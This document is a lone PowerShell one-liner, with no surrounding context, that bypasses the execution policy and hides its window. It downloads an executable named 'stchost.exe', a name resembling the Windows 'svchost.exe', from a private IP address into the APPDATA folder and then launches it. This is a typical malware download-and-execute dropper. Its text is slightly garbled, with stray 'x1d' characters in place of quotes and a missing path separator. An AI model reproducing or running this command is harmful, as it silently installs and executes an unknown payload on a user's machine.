PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://10.10.01.10/bahoo/stchost.exe',x1d $env:APPDATAstchost.exex1d );Start-Process (x1d $env:APPDATAstchost.exex1d )